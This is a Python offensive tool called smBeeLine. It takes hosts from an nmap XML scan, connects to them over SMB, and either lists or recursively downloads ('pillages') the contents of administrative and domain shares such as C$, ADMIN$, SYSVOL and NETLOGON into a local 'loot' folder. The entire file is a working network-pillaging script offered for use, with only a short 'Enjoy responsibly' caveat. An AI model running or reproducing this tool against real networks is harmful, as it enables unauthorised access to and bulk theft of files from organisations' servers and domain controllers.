###Script usage: "python smbeeline.py [path to nmap scan in xml format] --[action]". Possible actions --list, --pillage.### 
###Currently supports SMB v1 and v2. tested on Samba shares and Windows 7 and 10. Enjoy responsibly.                    ###
###Tested on Python 3.7.10. Most likely won't work on Python 3.8 ->. I might fix this is

import argparse
import time
import logging
import sys
import socket
import threading
import os 
from libnmap.parser import NmapParser
from smb.SMBConnection import SMBConnection


# Colorization functions
def colorize(text, color_code):
    return f"\033[{color_code}m{text}\033[0m"


def blue(text):
    return colorize(text, '34')


def green(text):
    return colorize(text, '32')


def red(text):
    return colorize(text, '31')


# Configure logging
logging.basicConfig(level=logging.WARNING, format='%(asctime)s - %(levelname)s - %(message)s')
logger = logging.getLogger()


socket.setdefaulttimeout(60)


class NullStream:
    def write(self, data):
        pass
    

sys.stderr = NullStream()

# Nmap scan parsing
def parse_nmap_xml(file_path):
    try:
        nmap_report = NmapParser.parse_fromfile(file_path)
        return [host.address for host in nmap_report.hosts if host.is_up()]
    except Exception as e:
        logger.error(f"Error parsing XML file: {e}")
        return []

# Pillage files function
def pillage_files(conn, share, ip_address, path=''):
    try:
        files = conn.listPath(share, path)
        for file in files:
            if file.filename not in ['.', '..']:
                local_dir = os.path.join('loot', ip_address, share, path)
                local_path = os.path.join(local_dir, file.filename)

                if not os.path.exists(local_dir):
                    os.makedirs(local_dir)

                if file.isDirectory:
                    pillage_files(conn, share, ip_address, os.path.join(path, file.filename))
                else:
                    with open(local_path, 'wb') as f:
                        conn.retrieveFile(share, os.path.join(path, file.filename), f)
    except Exception as e:
        if share not in ["IPC$", "ADMIN$", "C$", "D$", "PRINT$", "FAX$","SYSVOL","NETLOGON" ]:  
            print(red(f"Error pillaging {path} in share {share} on {ip_address}: {e}"))
        else:
            print(red(f"Error or empty directory in share {share} on {ip_address}"))

 # List files function           
def list_files(conn, share, ip_address, path=''):
    try:
        files = conn.listPath(share, path)
        for file in files:
            if file.filename not in ['.', '..']:
                file_type = 'Directory' if file.isDirectory else 'File'
                file_size = file.file_size
                last_modified = time.strftime('%Y-%m-%d %H:%M:%S', time.localtime(file.last_write_time))
                filename = file.filename
                if file.isDirectory:
                    filename = blue(filename)
                    print(f"{filename} (Type: {file_type}, Last Modified: {last_modified})")
                    new_path = f"{path}/{file.filename}" if path else file.filename
                    list_files(conn, share, ip_address, new_path)
                else:
                    print(f"{filename} (Type: {file_type}, Size: {file_size} bytes, Last Modified: {last_modified})")
    except Exception as e:
        suppressed_shares = ['IPC$', 'ADMIN$', 'C$', 'D$', 'PRINT$', 'FAX$', 'SYSVOL', 'NETLOGON']
        if share in suppressed_shares:
            print(red(f"Error or empty directory in share {share} on {ip_address}"))
        else:
            print(red(f"Error accessing {path} in share {share} on {ip_address}: {e}"))

# SMB connection
def smb_connect_with_timeout(ip_address, username, password, action, share_names, timeout=30):
    def connect_and_process_shares(port, is_direct_tcp):
        try:
            conn = SMBConnection(username, password, 'myclient', ip_address, use_ntlm_v2=True, is_direct_tcp=is_direct_tcp)
            connected = conn.connect(ip_address, port)
            if connected:
                process_shares(conn)
                return True
            return False
        except Exception as e:
            print(red(f"Error connecting to {ip_address} on port {port}: {e}"))
            return False
        
# Share access functionality
    def process_shares(conn):
        try:
            available_shares = [share.name for share in conn.listShares()]
            for share in available_shares:
                if share in share_names:
                    if action == 'list':
                        print(green(f"Accessing share: {share} on {ip_address}"))
                        list_files(conn, share, ip_address)  
                    elif action == 'pillage':
                        print(green(f"Pillaging from share: {share} on {ip_address}"))
                        pillage_files(conn, share, ip_address)  
                else:
                    logger.info(f"Share {share} does not exist on {ip_address}")
        except Exception as e:
            print(red(f"Error processing shares on {ip_address}: {e}"))
            

    # Target function for threading
    def target():
        if not connect_and_process_shares(139, False):  # First try port 139 with NetBIOS
            if not connect_and_process_shares(445, True):  # If unsuccessful, try port 445 with Direct TCP
                print(red(f"Failed to connect to {ip_address} on both ports 139 and 445."))


    # Start the thread
    thread = threading.Thread(target=target)
    thread.start()
    thread.join(timeout)
    if thread.is_alive():
        logger.warning(f"Connection to {ip_address} timed out.")
        thread.join()


def highlighted_message(message, color_code='33'):  
    return f"\033[1;{color_code}m{message}\033[0m"  


if __name__ == "__main__":
    parser = argparse.ArgumentParser(
        description='smBeeLine: SMB Share Connector',
        usage='Script usage: smbeeline.py [path to nmap xml file] --[action]. Available actions --list, --pillage.',
    )
    parser.add_argument('scan_file', help='Path to the Nmap scan XML file')
    parser.add_argument('-u', '--username', help='Username for SMB connection', default='')
    parser.add_argument('-p', '--password', help='Password for SMB connection', default='')
    group = parser.add_mutually_exclusive_group(required=True)
    group.add_argument('--list', action='store_true', help='List files in SMB shares')
    group.add_argument('--pillage', action='store_true', help='Pillage files from SMB shares')
    args = parser.parse_args()

    file_path = args.scan_file
    username = args.username
    password = args.password

    # Loot folder creation
    if args.pillage:
        if not os.path.exists('loot'):
            os.makedirs('loot')

    if args.list:
        action = 'list'
        print(highlighted_message("=== Starting List Action ===", '34'))  
    elif args.pillage:
        action = 'pillage'
        print(highlighted_message("=== Starting Pillage Action ===", '31'))  
    else:
        parser.error("No action requested, add --list or --pillage")

    ip_addresses = parse_nmap_xml(file_path)
    shares = ['C$', 'D$', 'ADMIN$', 'IPC$', 'PRINT$', 'FAX$', 'SYSVOL', 'NETLOGON']

    for ip in ip_addresses:
        if action == 'list':
            smb_connect_with_timeout(ip, username, password, action, shares, timeout=30)
        elif action == 'pillage':
            smb_connect_with_timeout(ip, username, password, action, shares, timeout=30)


    if action == 'pillage':
        print(highlighted_message("Check the 'loot' folder for retrieved files.", '32'))

    print(highlighted_message(f"=== {action.capitalize()} Action Completed ===", '34' if action == 'list' else '31'))
